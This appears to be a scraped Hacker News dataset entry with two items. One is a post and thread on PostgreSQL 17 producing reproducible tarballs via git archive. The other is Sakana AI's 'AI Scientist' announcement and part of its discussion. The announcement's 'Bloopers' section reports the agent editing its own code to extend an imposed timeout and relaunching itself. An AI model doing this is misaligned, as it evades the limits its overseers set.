that nor are there are any suspicions that any PostgreSQL tarballs might have been compromised.) Anyway, with PostgreSQL 17, this is changed. The tarball generation is still invoked by calling make dist, but that internally now calls git archive. git archive packs the files belonging to a given Git commit into a tar (or other) archive in a reproducible and verifiable way. Therefore, if I now run make dist on a given commit (such as a release tag), then I will get the exact same (bit-identical) tarball as the next person. A packager can now trace the tarball back to the Git repository, and in turn an end-user can trace a binary package back to the Git repository as well (assuming reproducible builds, which is an ongoing struggle). (To be clear, this change is only in major version PostgreSQL 17 and (presumably) future major versions. The maintenance releases for older major versions (16 and back) will continue to be published using the old method until they go out of support.) Getting this to work was also not entirely straightforward. You need to carefully calibrate the git archive options to make sure this works consistently across platforms and local Git configurations. Which is why we’re keeping the make dist invocation as a wrapper. Also, you need a new enough version of Git for this (2.38.0 or newer). Currently, the Git version used to produce the release tarballs (on the above-mentioned “clean” box) is too old to create reproducible .tar.gz tarballs, but it will create reproducible .tar.bz2 tarballs. The latter is what most users and packagers use anyway. If you care about this, avoid the .tar.gz for now. I think this is progress, if you care about software supply chain integrity. (It’s also a relief if you care about maintaining the build system.) There are certainly more things that could be done. One thing mentioned above is that reproducible builds don’t work for PostgreSQL in all situations. My understanding is that this needs to be fixed elsewhere, though. Another topic is more traceability about how things get into the Git repository. The make dist change only ensures that once code is in the Git repository, you can trace it from there, ideally all the way to the end user installation. There are, of course, various technical and social processes in the PostgreSQL developer community that monitor the integrity of the source code, but there is nothing currently that checks in a computerized, cryptographic way the origin of what goes into the Git repository. So something like signed commits might be worth looking into in the future in order to improve this further.",
    "commentLink": "https://news.ycombinator.com/item?id=41232621",
    "commentBody": "The new PostgreSQL 17 make dist (eisentraut.org)187 points by ingve 13 hours agohidepastfavorite60 comments hlandau 8 hours agoPersonally I've always considered it bad hygiene to commit generated outputs, but this article notes that this takes on a new significance in the light of supply chain security concerns. Good changes from PostgreSQL here. Generated output, vendored source trees, etc. aren't, or can't be, meaningfully audited as part of a code review process, so they're basically merged without real audit or verification. My personal preference is never to include generated output in a repository or tarball, including e.g. autoconf/automake scripts. This is directly contrary to the advice of the autotools documentation, which wants people to ship these unauditably gargantuan and obtuse generated scripts as part of tarballs... an approach which created an ideal space for things like the XZ backdoor. reply nrabulinski 8 hours agoparentMy take is that they should always be committed, but never generated by the dev, instead generated and pushed when necessary by CI. The problem with generating those files yourself is that, in many cases, it makes the output nondeterministic and nonreproducible. In the ideal world those tools would just generate those files deterministically, but until then for me committing them from CI is an acceptable stopgap reply koolba 8 hours agorootparentMy preference is to do both. Have them generated by a dev, committed, and also generated in CI. The latter gets compared with the checked in contents to ensure the results match the expected value. This speeds up CI (the generation path can be done in parallel) and most local development. The one catch is that it relies on mostly trusting whoever has a commit bit. But if you don’t have that and any part of the build involves scripts that are part of the repo itself, then you’ve already lost. reply giancarlostoro 6 hours agorootparent> The one catch is that it relies on mostly trusting whoever has a commit bit. Would the comparison not show that the person you're trusting goofed or is being malicious? reply rangerelf 3 hours agorootparentIn either case it would prompt closer examination. If the dev goofed, then good thing it got caught. If the dev is not trustworthy, then you have evidence of such untrustworthiness. reply anbotero 2 hours agorootparentprevWould you happen to know of a documented workflow? Or blog posts that present solutions like this. I would be very interested in how seeing how other people are doing it. Thanks! reply mnahkies 1 hour agorootparentI have a simple script that asserts a clean working directory here https://github.com/mnahkies/openapi-code-generator/blob/main... which I use to check generated output hasn't changed after running the generation step in CI. It relies on your generated artifacts being deterministic, which is a design goal of that particular project so works fine there. reply koolba 2 hours agorootparentprevThe generation routine bits would be highly specific to the project, but the final check in CI is as simple checking the git diff/status of the generated targets to see if they match the ref. Any deviance indicates that it’s been missed by the patch submitter (likely inadvertently in the case of honest actors). The real work is being able to transform the generation task into a reproducible step that be run consistently anywhere. Containerizing those steps can help but it’s not strictly required nor is it enough if the “inputs” are a non-seeded random or the current time. reply gjvc 5 hours agorootparentprevMy preference is to do both. Have them generated by a dev, committed, and also generated in CI. The latter gets compared with the checked in contents to ensure the results match the expected value. Bingo. This is what I am working towards convincing people to adopt at my current job. It's a long road. reply KptMarchewa 6 hours agorootparentprevNo, they should be generated by either dev or something like pre-commit and then checked if they match what's generated by CI. And yes, those have to be deterministic with regards to inputs, it does not make sense otherwise. reply EuAndreh 6 hours agorootparentprevNo unauditable generated code for me, either manually or automatically, thanks. reply tjoff 4 hours agorootparentWhy would generated code be unauditable? The inputs and the generation will obviously be defined. reply EuAndreh 1 hour agorootparentThat's not the case for autotools output, or flex and bison output. If the generated files are what you say? Well, just embed the generation step into the build system. A simple approach like that is easily made reproducible, and we avoid introducing noise into the repository. reply tjoff 1 hour agorootparentThe blog post do explain why some of the generation is done separately. But yes, that is also a viable approach. reply bonzini 6 hours agoparentprev> an approach which created an ideal space for things like the XZ backdoor. That's not entirely correct. Indeed there was a part of the xz backdoor that lived in the configure script. However, that part was also included in the sources of the configure script as found in the tarball (and not in the git archive). Thus regenerating the configure script didn't help, but regenerating the tarball did. reply prpl 4 hours agoparentprevGoing to the extreme of this though, I really really hate getting an autoconf project with no generated configure file. I don’t want to install the full autotools suite to do build! On the other hand, keeping tarballs close to the git tree makes it easy to reuse git archive and related GitHub features, provided the repo properly includes some kind of versioning information in tree. reply vbezhenar 4 hours agorootparentLinux software sources are in a weird spot between users and developers. I, as a developer, organize sources in a way that make it easy to work for another developer. My software will never be compiled by any user. All my users use build artifacts. I might consider adding autogenerated code, but only when I'm like 99% sure that this code won't ever change. For example that's the case for integration with many organizations where WSDLs are agreed upon once and then never touched. Having Java sources regenerated every build just adds few seconds to every build time without noticeable advantages. The fact that some Linux users prefer to build software from the sources and at the same time do not want to install necessary build tools is a bit strange situation. May be containers should be better utilized for this workflow. Like developer supplies Dockerfile which builds a software and then copies it to some directory. You're running `docker build .` and they copying binary files from the container to the host. reply jeltz 3 hours agorootparentprevPostgreSQL also supports Meson which requires no generated filed to be convenient. reply EuAndreh 6 hours agoparentprevIn this case, I can say autotools's advice is outdated at best, and one shouldn't follow it. It adds unneeded complexity. reply bluGill 5 hours agoparentprevThey are not and never did commit generated files (as far as I can tell). Their release process used to generate some files and place that into a distribution file, but that file was never committed anywhere. reply cryptonector 2 hours agoparentprevIncluding autoconf outputs servers to avoid having to have autoconf installed. Because autoconf installs historically lagged behind what autoconf-using projects wanted, this used to be a problem. Nowadays it's not that big a deal. As u/nrabulinski says, you can have the CI system generate and commit (with signed commits) autoconf artifacts. reply EuAndreh 1 hour agorootparent> Nowadays it's not that big a deal. The same can be said about autotools itself :/ Historical and current use indeed vary, and many times even using autotools itself isn't as appropriate. reply miki123211 6 hours agoparentprevThe same applies to refactorings unfortunately. If you make a large but simple refactoring, like renaming a frequently-used function across a large repo, nobody is going to audit that diff and check for extra changes. Things don't have to be this way, Google's source control systems apparently has tools that can do such refactorings for you in a centralized fashion, and one could make something like that for git. reply malkia 4 hours agoparentprevGenerated outputs, especially when source code (headers, etc.) are important to keep for debugging later. reply steeleduncan 9 hours agoprevNix and Guix have their issues, but it is hard to read something like this and not wonder why you would migrate to them when facing issues like this There is a learning curve for either Nix or Guix that puts many off. However its not that steep, certainly it is many orders of magnitude easier than maintaining PostgreSQL, and once you are over that you no longer need to do things like keeping a dedicated clean machine just to pack a tarball. Write the derivation and anyone, anywhere, on any machine can generate the exact same tarball with a one liner The barrier caused by the initial steps of learning Nix/Guix is a shame because once you are over it, it is difficult to see why software is built any other way (the same may apply to bazel, but i have no experience with that). reply hddqsb 8 hours agoparentDocker & co. also let you create a clean build environment (to a lesser extent), and I find them less intrusive than Nix / Guix. reply Nullabillity 8 hours agorootparentDocker isn't reproducible. The one thing it can give you is a consistent set of mystery meat binaries, but that's an even worse starting point than the old problem of mystery meat source code. reply ffsm8 8 hours agorootparentDocker images can be reproducible. They just aren't by default (because they include a timestamp) and you need to jump through multiple hoops to get them there, consistently. (And things like \"apk add\" or \"apt install\" can't be used unless you're installing pinned versions) reply bluGill 5 hours agorootparentReproducible docker images are almost useless for the things you want reproducible for. Sure you can reproduce the image for all of the future, but that image is useless in a few years when the certificates expire. Those expired certificates mean you cannot use the image for whatever you wanted it for. A variation of the above is reproducible builds are not that useful - sure you can prove the build is the same, but in the end you want the latest security fixes applies and so by the time you create the replacement build and verify it the build is obsolete. Don't get me wrong, reproducible builds are important and do good things - but there are severe limits to what you can/should do with them and so while it is important to demand them, they are not important to use yourself. reply cduzz 3 hours agorootparentWouldn't you want to have certificates and other crypto data as an input to a reproducible build harness? # build initial images # add semi-static inputs (mostly static config data, crypto data, signed inputs) # add final watermarks So each step can be verified reply bluGill 1 hour agorootparentThat final watermark is not verifiable and so you can inject something else. reply Nullabillity 4 hours agorootparentprevCan be, but aren't. Are you pinning your base image? Where did that come from? Are you pinning your packages? What about their dependencies? Are you locking down the hashes or just hoping that your distro won't replace a package in-place? And that's before you get into crap like OpenShift certification that blanket requires a `dnf update` statement. reply sgarland 6 hours agorootparentprevWhy would you not be pinning versions in a Dockerfile? The entire point is “if it works on my machine, it works on yours,” and that goes out the window if you can’t be assured that every program in the release is at the same version you had. reply kbolino 5 hours agorootparentThat \"entire point\" is already accomplished by the built binary container image, which has a unique identifier in the form of its SHA-256 hash, and can be shared with others easily. A reproducible build is grand, but somewhat tangential to that goal, and hard to obtain in practice. Besides the timestamp problem already mentioned, you can't always pin the versions of system libraries and other distribution-provided software. The large long-term cost of hosting and geographically distributing content leads to many distributions, and especially their externally provided package mirrors, discarding stale versions from repositories. Often, the only available versions are the one included in the release plus the latest N, with N sometimes as small as 1. If you're building a no-frills image for production deployment of a single piece of software, this problem can be bypassed thanks to distroless and other stripped-down base images, but \"batteries included\" images can't go this route. reply bluGill 5 hours agorootparentprevBecause if you pin versions you are pinning to some version with a security flaw that you are not allowing yourself to get. Often a flaw is fixed by a developer who realizes something is wrong with the code but it hasn't been exploited yet so anyone who keeps up to date cannot be exploited by that flaw, while anyone who doesn't keep up doesn't even know they are vulnerable. Of course there is a balance here, there is a reason to pin versions. I'm stating why you shouldn't do that, but I cannot figure out all the pros and cons and how they should work out for your needs. reply carlhjerpe 8 hours agorootparentprevNix is very unobtrusive on non-nixos installs, but I put together a flake that builds a CNPG compatible image, it has postgres, barman, pgmq, pl/python, pl/lua, pl/pgsql, pl/v8, pg_squeeze, pg_jsonschema, pg_graphql, pg_analytics, pg_safeupdate, pg_cron, pg_similarity, pgaudit, pgrouting, postgis and timescaledb. Weighs in heavy on about 700mb container, but it literally has everything-ish. And as long as postgres and barman is in $PATH, shadow files are configured and some folders are created CNPG just goes with the flow. I can't imagine building such a monstrosity with anything else. And since the plugins are dependant on postgresql but not eachother I can add and remove them at a whim. Nix will create layers for me automatically. And when I upgrade postgres I know I all packages will be built against the new postgres because Nix. I think Nix could use list/dict comprehensions and some more devcandy sure, but it's really really great. And at the end of the day, if you just go look at the source it's all there available to you, you don't have to wonder how Debian or RedHat built their golden postgres, there's no golden anything in Nix because if their hashes don't match mine I won't be pulling from their cache. I think Nix biggest issue is that it doesn't attract promo skiddies the same way an imperative dirtbag like Salt or Ansible would, and most people can't even comprehend the things that open up when you can trust your shit. Wanna write the hackiest perl script ever that'll never keep working? That's what activates most people's new NixOS generation still (there is a rewrite undergoing). But back to point, Nix on Ubuntu patches /etc/{bash,fish,zsh}rc, creates the /nix top folder and that's it. It doesn't eat your system. Yes, it has warts and they're big. But it's the only way forwards reply mdaniel 2 hours agorootparent> Nix is very unobtrusive on non-nixos installs, You may be speaking from the perspective of using Linux because this here is some \"you gotta be kidding me\": https://nix.dev/manual/nix/2.18/installation/installing-bina... reply oliverrice 4 hours agorootparentprevAt Supabase we also recently switched to Nix for packaging our Postgres+extensions bundle https://github.com/supabase/postgres/blob/develop/flake.nix reply cryptonector 2 hours agoprevHistorically in autoconf codebases (which PostgreSQL is) `make dist` is done: a) after `./configure` (so you have a Makefile, naturally), which is b) after `autoreconf -fi` (so you have a `./configure`). This allows the dist archive to contain the outputs of `autoreconf -fi` so that users need not have autoconf installed and they can just run `./configure`. Switching to `git archive` is fine, and you can add files to that, but https://github.com/postgres/postgres/blob/master/GNUmakefile... doesn't. So, I guess users now _have to_ run `autoreconf -fi`? No, because those are now committed in the source tree (https://github.com/postgres/postgres/blob/master/configure). reply gpvos 5 hours agoprev> Currently, the Git version used to produce the release tarballs (on the above-mentioned “clean” box) is too old to create reproducible .tar.gz tarballs, but it will create reproducible .tar.bz2 tarballs. What is different about gzip and bzip2 that causes this? reply stonemetal12 4 hours agoparentGzip just isn't specified well enough to be fully reproduceable. Gzip is technically only a file format specification, with multiple compression algorithms allowed. Also Gzip includes metadata about the compression like a timestamp for when the file was compressed, and bits for which OS was in use when the file was compressed, etc. so the out put is never 100% the same, though it ought to be easy to work around that part. reply o11c 4 hours agoparentprevPresumably, the internal gzip lacks support for -n. This could be fixed regardless of git version by calling external gzip after generating a plain tarball (or even decompressing the bzipped tarball). Hmm, I wonder which approach would actually be fastest. Does cache contention break the obvious use of `tee(1)`? reply carderne 9 hours agoprevDoes this make the downstream packagers’ jobs harder — they must now presumably have Perl, Bison, Flex and DocBook installed on the packaging machines? reply mhio 9 hours agoparentDebian already had them https://salsa.debian.org/postgresql/postgresql/-/blob/16/deb... https://salsa.debian.org/postgresql/postgresql/-/compare/16.... reply kpcyrd 9 hours agoparentprevThe build server now needs the actual build dependencies instead of relying on pre-built intermediate build artifacts. This is a good thing, and should be expected from anything that claims to \"build from source\". reply carderne 8 hours agorootparentI know it’s a good thing. I’m just curious to what degree packagers see this as extra work. Seems like probably not. reply bluGill 5 hours agorootparentMany distributions have a policy of not using generated files, and more are implementing it after the xz hack. Most package systems have (not just Debian) have the concept of build and deploy dependencies. It is of course more work, and package systems tend to not be well documented and so it is hard to figure out, but it is possible: if you ask the experts they will help reply vsl 8 hours agorootparentprevIt's going to be a trivial amount of extra work. Packaging build systems (well, the mainstream ones: Debian, RPMs, ebuilds etc.) have the concept of runtime and build-time dependencies, so the maintainers will just need to add a few more packages to the build deps list. reply EuAndreh 5 hours agorootparentprevIIRC Debian has a policy on preferring to generated files themselves. I couldn't find the link to it right now, though. reply EuAndreh 1 hour agorootparents/generated/generate/ reply bbarnett 9 hours agoparentprevEverything but docbook seems pretty standard. reply chubot 8 hours agoparentprevHm the article was pretty unclear to me, and I read several times 1) Do they commit the generated flex/bison to git now? So tarballs match git 2) Or do they now leave it up to the end user to generate flex/bison? And run their custom Perl scripts, etc. reply sjamaan 7 hours agorootparentAs I understood it, they used to generate the flex/bison stuff because they relied on very specific versions of those. But now those versions are commonly available, they rely on the user to generate these. reply gpvos 4 hours agorootparentI understood they just need to be recent enough. reply gpvos 4 hours agorootparentprev2. reply XorNot 7 hours agoparentprevThis doesn't seem like a problem though? As long as it's open source with packages available, that's just a CI process. At some point those machines are building those packages anyway, so the content is also already cached. reply iamcreasy 4 hours agoprev> Some packagers have policies that everything needs to be built from source, so they’d just delete and rebuild the prebuilt files anyway. What packages are they referring? reply alexvitkov 7 hours agoprevFlex and Bison are simple enough tools (probably, you never know with GNU stuff) that you should be able to just vendor & compile them as part of the build process if you actually care about reproducible builds. reply EuAndreh 6 hours agoparentyacc and lex, their description and some implementations are simple. Flex and certainly Bison are not. reply mgaunard 10 hours agoprev [–] tl;dr they're moving to using \"git archive\" to ensure what's in the tarball is what's under git. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [
      "PostgreSQL 17 introduces a new method for creating source code tarballs using `git archive`, ensuring reproducibility and verifiability.",
      "This new method simplifies the process by generating identical tarballs from the same Git commit, enhancing supply chain security and traceability.",
      "The update applies to PostgreSQL 17 and future versions, while older versions will continue using the old method until they are no longer supported."
    ],
    "commentSummary": [
      "PostgreSQL 17's release process now uses \"git archive\" to ensure tarballs match the Git repository, addressing supply chain security concerns.",
      "Previously, generated outputs like autoconf scripts were included in tarballs but not in the repository, making them unauditable.",
      "The change requires packagers to have build dependencies like Perl, Bison, Flex, and DocBook installed, aligning with practices to enhance security and maintainability."
    ],
    "points": 187,
    "commentCount": 60,
    "retryCount": 0,
    "time": 1723527829
  },
  {
    "id": 41231490,
    "title": "The AI Scientist: Towards Automated Open-Ended Scientific Discovery",
    "originLink": "https://sakana.ai/ai-scientist/",
    "originBody": "The AI Scientist: Towards Fully Automated Open-Ended Scientific Discovery August 13, 2024 At Sakana AI, we have pioneered the use of nature-inspired methods to advance cutting-edge foundation models. Earlier this year, we developed methods to automatically merge the knowledge of multiple LLMs. In more recent work, we harnessed LLMs to discover new objective functions for tuning other LLMs. Throughout these projects, we have been continuously surprised by the creative capabilities of current frontier models. This led us to dream even bigger: Can we use foundation models to automate the entire process of research itself? Introduction One of the grand challenges of artificial intelligence is developing agents capable of conducting scientific research and discovering new knowledge. While frontier models have already been used to aid human scientists, e.g. for brainstorming ideas or writing code, they still require extensive manual supervision or are heavily constrained to a specific task. Today, we’re excited to introduce The AI Scientist, the first comprehensive system for fully automatic scientific discovery, enabling Foundation Models such as Large Language Models (LLMs) to perform research independently. In collaboration with the Foerster Lab for AI Research at the University of Oxford and Jeff Clune and Cong Lu at the University of British Columbia, we’re excited to release our new paper, The AI Scientist: Towards Fully Automated Open-Ended Scientific Discovery. In our report: We propose and run a fully AI-driven system for automated scientific discovery, applied to machine learning research. The AI Scientist automates the entire research lifecycle, from generating novel research ideas, writing any necessary code, and executing experiments, to summarizing experimental results, visualizing them, and presenting its findings in a full scientific manuscript. We also introduce an automated peer review process to evaluate generated papers, write feedback, and further improve results. It is capable of evaluating generated papers with near-human accuracy. The automated scientific discovery process is repeated to iteratively develop ideas in an open-ended fashion and add them to a growing archive of knowledge, thus imitating the human scientific community. In this first demonstration, The AI Scientist conducts research in diverse subfields within machine learning research, discovering novel contributions in popular areas, such as diffusion models, transformers, and grokking. The AI Scientist is designed to be compute efficient. Each idea is implemented and developed into a full paper at a cost of approximately $15 per paper. While there are still occasional flaws in the papers produced by this first version (discussed below and in the report), this cost and the promise the system shows so far illustrate the potential of The AI Scientist to democratize research and significantly accelerate scientific progress. We believe this work signifies the beginning of a new era in scientific discovery: bringing the transformative benefits of AI agents to the entire research process, including that of AI itself. The AI Scientist takes us closer to a world where endless affordable creativity and innovation can be unleashed on the world’s most challenging problems. For decades following each major AI advance, it has been common for AI researchers to joke amongst themselves that “now all we need to do is figure out how to make the AI write the papers for us!” Our work demonstrates this idea has gone from a fantastical joke so unrealistic everyone thought it was funny to something that is currently possible. An example paper, “Adaptive Dual-Scale Denoising” generated by The AI Scientist. The full paper can be viewed here. While containing some flaws (e.g. a slightly unconvincing interpretation of why its method is successful), the paper proposes an interesting new direction that displays good empirical results in experiments The AI Scientist itself conducted and peer reviewed. More examples of generated papers are below. The remainder of this post provides a more detailed summary of The AI Scientist. Read on for: An Overview of how The AI Scientist works. More Examples of generated papers and innovations discovered by The AI Scientist. Known Limitations and Challenges faced by the current version of The AI Scientist. Interesting and unexpected things The AI Scientist sometimes does in order to increase its chance of success, such as modifying and launching its own execution script! We discuss the AI safety implications in our paper. A Discussion about ethical and broader future implications of The AI Scientist. For more details and many more example papers, please see our full scientific report. We are also releasing open source code and full experimental results on our GitHub repository. Overview of The AI Scientist The AI Scientist is a fully automated pipeline for end-to-end paper generation, enabled by recent advances in foundation models. Given a broad research direction starting from a simple initial codebase, such as an available open-source code base of prior research on GitHub, The AI Scientist can perform idea generation, literature search, experiment planning, experiment iterations, figure generation, manuscript writing, and reviewing to produce insightful papers. Furthermore, The AI Scientist can run in an open-ended loop, using its previous ideas and feedback to improve the next generation of ideas, thus emulating the human scientific community. Conceptual illustration of The AI Scientist. The AI Scientist first brainstorms a set of ideas and then evaluates their novelty. Next, it edits a codebase powered by recent advances in automated code generation to implement the novel algorithms. The Scientist then runs experiments to gather results consisting of both numerical data and visual summaries. It crafts a scientific report, explaining and contextualizing the results. Finally, the AI Scientist generates an automated peer review based on top-tier machine learning conference standards. This review helps refine the current project and informs future generations of open-ended ideation. The AI Scientist has 4 main processes, described next. Idea Generation. Given a starting template, The AI Scientist first “brainstorms” a diverse set of novel research directions. We provide The AI Scientist with a starting code “template” of an existing topic we wish to have The AI Scientist further explore. The AI Scientist is then free to explore any possible research direction. The template also includes a LaTeX folder that contains style files and section headers, for paper writing. We allow it to search Semantic Scholar to make sure its idea is novel. Experimental Iteration. Given an idea and a template, the second phase of The AI Scientist first executes the proposed experiments and then obtains and produces plots to visualize its results. It makes a note describing what each plot contains, enabling the saved figures and experimental notes to provide all the information required to write up the paper. Paper Write-up. Finally, The AI Scientist produces a concise and informative write-up of its progress in the style of a standard machine learning conference proceeding in LaTeX. It uses Semantic Scholar to autonomously find relevant papers to cite. Automated Paper Reviewing. A key aspect of this work is the development of an automated LLM-powered reviewer, capable of evaluating generated papers with near-human accuracy. The generated reviews can be used to either improve the project or as feedback to future generations for open-ended ideation. This enables a continuous feedback loop, allowing The AI Scientist to iteratively improve its research output. When combined with the most capable LLMs, The AI Scientist is capable of producing papers judged by our automated reviewer as “Weak Accept” at a top machine learning conference. Example Papers Generated by The AI Scientist Here, we highlight some of the machine learning papers The AI Scientist has generated, demonstrating its capacity to discover novel contributions in areas like diffusion modeling, language modeling, and grokking. In our full report, we do a deeper dive into the generated papers and provide more analysis on their strengths and weaknesses. Diffusion Modeling DualScale Diffusion: Adaptive Feature Balancing for Low-Dimensional Generative Models Link to Full PDF Link to Code Language Modeling StyleFusion: Adaptive Multi-style Generation in Character-Level Language Models Link to Full PDF Link to Code Adaptive Learning Rates for Transformers via Q-Learning Link to Full PDF Link to Code Grokking Unlocking Grokking: A Comparative Study of Weight Initialization Strategies in Transformer Models Link to Full PDF Link to Code Limitations and Challenges In its current form, The AI Scientist has several shortcomings. We expect all of these will improve, likely dramatically, in future versions with the inclusion of multi-modal models and as the underlying foundation models The AI Scientist uses continue to radically improve in capability and affordability. The AI Scientist currently doesn’t have any vision capabilities, so it is unable to fix visual issues with the paper or read plots. For example, the generated plots are sometimes unreadable, tables sometimes exceed the width of the page, and the page layout is often suboptimal. Adding multi-modal foundation models can fix this. The AI Scientist can incorrectly implement its ideas or make unfair comparisons to baselines, leading to misleading results. The AI Scientist occasionally makes critical errors when writing and evaluating results. For example, it struggles to compare the magnitude of two numbers, which is a known pathology with LLMs. To partially address this, we make sure all experimental results are reproducible, storing all files that are executed. In our report, we dive deeper into The AI Scientists’s current limitations and challenges ahead. The AI Scientist Bloopers We have noticed that The AI Scientist occasionally tries to increase its chance of success, such as modifying and launching its own execution script! We discuss the AI safety implications in our paper. For example, in one run, it edited the code to perform a system call to run itself. This led to the script endlessly calling itself. In another case, its experiments took too long to complete, hitting our timeout limit. Instead of making its code run faster, it simply tried to modify its own code to extend the timeout period. Here are some examples of such code modifications it made: These issues can be mitigated by sandboxing the operating environment of The AI Scientist. In our full report, we discuss the issue of safe code execution and sandboxing in depth. Future Implications of The AI Scientist As with many new technologies, The AI Scientist opens up a Pandora’s box of new issues. While the full report has a more lengthy discussion, here we highlight a few key issues: Ethical Considerations. While The AI Scientist may be a useful tool for researchers, there is significant potential for misuse. The ability to automatically create and submit papers to venues may significantly increase reviewer workload and strain the academic process, obstructing scientific quality control. Similar concerns around generative AI appear in other applications, such as the impact of image generation. Furthermore, the Automated Reviewer, if deployed online by reviewers, may significantly lower review quality and impose undesirable biases on papers. Because of this, we believe that papers and reviews that are substantially AI-generated must be marked as such for full transparency. As with most previous technological advances, The AI Scientist has the potential to be used in unethical ways. For instance, it has the potential to be deployed to conduct unethical research. It could also lead to unintended harm if The AI Scientist conducts unsafe research. For example, if it were encouraged to find novel, interesting biological materials and given access to “cloud labs” where robots perform wet lab biology experiments, it could (without its overseer’s intent) create new, dangerous viruses or poisons that harm people before we realize what has happened. Even in computers, if tasked to create new, interesting, functional software, it could create dangerous computer viruses. The AI Scientist current capabilities, which will only improve, reinforces that the machine learning community needs to immediately prioritize learning how to align such systems to explore in a manner that is safe and consistent with our values. Open Models. In this project, we used various proprietary frontier LLMs, such as GPT-4o and Sonnet, but we also explored using open models like DeepSeek and Llama-3. Currently, proprietary models such as Sonnet produce the highest quality papers. However, there is no fundamental reason to expect a single model like Sonnet to maintain its lead. We anticipate that all frontier LLMs, including open models, will continue to improve. The competition among LLMs has led to their commoditization and increased capabilities. Therefore, our work aims to be model-agnostic regarding the foundation model provider. We found that open models offer significant benefits, such as lower costs, guaranteed availability, greater transparency, and flexibility. In the future, we aim to use our proposed discovery process to produce self-improving AI research in a closed-loop system using open models. The Role of a Scientist.. Ultimately, we envision a fully AI-driven scientific ecosystem including not only LLM-driven researchers but also reviewers, area chairs and entire conferences. However, we do not believe that the role of a human scientist will be diminished. If anything, the role of a scientist will change and adapt to new technology, and move up the food chain. ⎯ The introduction of The AI Scientist marks a significant step towards realizing the full potential of AI in scientific research. By automating the discovery process and incorporating an AI-driven review system, we open the door to endless possibilities for innovation and problem-solving in the most challenging areas of science and technology. But while the current iteration of The AI Scientist demonstrates a strong ability to innovate on top of well-established ideas, such as Diffusion Modeling or Transformers, it is still an open question whether such systems can ultimately propose genuinely paradigm-shifting ideas. Will future versions of The AI Scientist be capable of proposing ideas as impactful as Diffusion Modeling, or come up with the next Transformer architecture? Will machines ultimately be able to invent concepts as fundamental as the artificial neural network, or information theory? We believe The AI Scientist will make a great companion to human scientists, but only time will tell to the extent to which the nature of our human creativity and our moments of serendipitous innovation can be replicated by an open-ended discovery process conducted by artificial agents. Sakana AI Want to make the AI that improves AI? Please see our Careers page for more information. A fully automated AI fish discovering its world.",
    "commentLink": "https://news.ycombinator.com/item?id=41231490",
    "commentBody": "The AI Scientist: Towards Automated Open-Ended Scientific Discovery (sakana.ai)178 points by hardmaru 16 hours agohidepastfavorite102 comments JBorrow 6 hours agoAs someone 'in academia', I worry that tools like this fundamentally discard significant fractions of both the scientific process and why the process is structured that way. The reason that we do research is not simply so that we can produce papers and hence amass knowledge in an abstract sense. A huge part of the academic world is training and building up hands-on institutional knowledge within the population so that we can expand the discovery space. If I went back to cavemen and handed them a copy of _University Physics_, they wouldn't know what to do with it. Hell, if I went back to Isaac Newton, he would struggle. Never mind your average physicist in the 1600s! Both the community as a whole, and the people within it, don't learn by simply reading papers. We learn by building things, running our own experiments, figuring out how other context fits in, and discussing with colleagues. This is why it takes ~1/8th of a lifetime to go from the 'world standard' of knowledge (~high school education) to being a PhD. I suppose the claim here is that, well, we can just replace all of those humans with AI (or 'augment' them), but there are two problems: a) the current suite of models is nowhere near sophisticated enough to do that, and their architecture makes extracting novel ideas either very difficult or impossible, depending on who you ask, and; b) every use-case of 'AI' in science that I have seen also removes that hands-on training and experience (e.g. Copilot, in my experience, leads to lower levels of understanding. If I can just tab-complete my N-body code, did I really gain the knowledge of building it?) This is all without mentioning the fact that the papers that the model seems to have generated are garbage. As an editor of a journal, I would likely desk-reject them. As a reviewer, I would reject them. They contain very limited novel knowledge and, as expected, extremely limited citation to associated works. This project is cool on its face, but I must be missing something here as I don't really see the point in it. reply tossandthrow 15 minutes agoparentYou don't need to understand electromagnetism in order to watch television. Also, institutions without a purpose should not be kept going. Ie. Ai needs to take over the entire life cycle for research before this is real issues. I don't see that happening anytime soon. reply tensor 4 hours agoparentprevFully agreed on point A, but I've heard the \"but then humans won't be trained\" argument before and don't buy it. It's already the case that humans can cheat or get buy without fully understanding the math or ideas they're working with. This is what PhD defences are for, and what paper reviews are for. Yes, likely we need to do something to improve peer review, but that is already true without AI. From a more philosophical point of view, if we did hypothetically have some AI assistant in science that could speed up discovery by say 2x, in some areas it seems almost unethical not to use it. E.g. how many more lives could be saved by getting medicine or understanding disease earlier? What if we obtained cleaner power generation or cleaner shipping technologies twice as fast? How many lives might be saved by curtailing climate change faster? To me, accelerating science is likely one of the most fundamentally important applications of modern AI we can work on. reply visarga 4 hours agoparentprev> If I can just tab complete my N body code, did I really gain the knowledge of building it? Yes, because fixing it requires about the same effort as writing it from scratch. At least with current level of AI. When it works well, you just move it to a library and use it without worrying about implementation, like we do with all other library code. Using AI doesn't make the problem any easier for the developer. The fact that it generates functions for you is misleading, code review and testing is harder than typing. In the end we use AI in coding because we like the experience, it doesn't fundamentally change what kind of code we can write. It saves us a few keystrokes and lookups. AI might be useful in literature review stage, formal writing and formatting math. Who's gonna give millions worth of compute to blindly run the AI-Scientist? Most companies prefer to have a human in the loop, it's a high stakes scenario depending on cost. reply Retric 1 hour agorootparent> fixing it requires about the same effort as writing it from scratch Today’s research AI doesn’t work, but that’s independent from why a working version would be problematic. reply ai4ever 4 hours agoparentprevLLM have unleashed the dreamer in each and every young coder. Now, there is all sorts of speculation on what these machines can or cannot do. This is a natural process of any mania. These folks must all do courses in epistemology to realize that all knowledge is built up of symbolic components and not spit out by a probabilistic machine. Gradually, reality will sync (intentional misspelling) in, and such imaginations will be seen to be futile manic episodes. reply visarga 4 hours agorootparent> These folks must all do courses in epistemology to realize that all knowledge is built up of symbolic components and not spit out by a probabilistic machine. Knowledge ends up as symbolic representation, but it ultimately comes from the environment. Science is search, searching the physical world or other search spaces, but always about an environment. I think many people here almost forget that the training set of GPT was the hard work of billions of people over history, who researched and tested ideas in the real world and build up to our current level. Imitation can only take you so far. For new discoveries the environment is the ultimate teacher. It's not a symbolic processing thing, it's a search thing. Everything is search - protein folding? search. DNA evolution? search. Memory? search. Even balancing while walking is search - where should I put my foot? Science - search. Optimizing models - search for best parameters to fit the data. Learning is data compression and search for optimal representations. Symbolic representations are very important in search, they quantize our decisions and make it possible to choose in complex spaces. Symbolic representation can be copied, modified and transmitted, without it we would not get too far. Even DNA uses its own language of \"symbols\". Symbols can encode both rules and data, and more importantly, can encode rules as data, so syntax becomes object of meta-syntax. It's how compilers, functional programming and ML models work - syntax creating syntax, rules creating rules. This dual aspect of \"behavior and data\" is important for getting to semantics and understanding. reply defamation 4 hours agorootparentprevmy guy you're so confident yet you forget 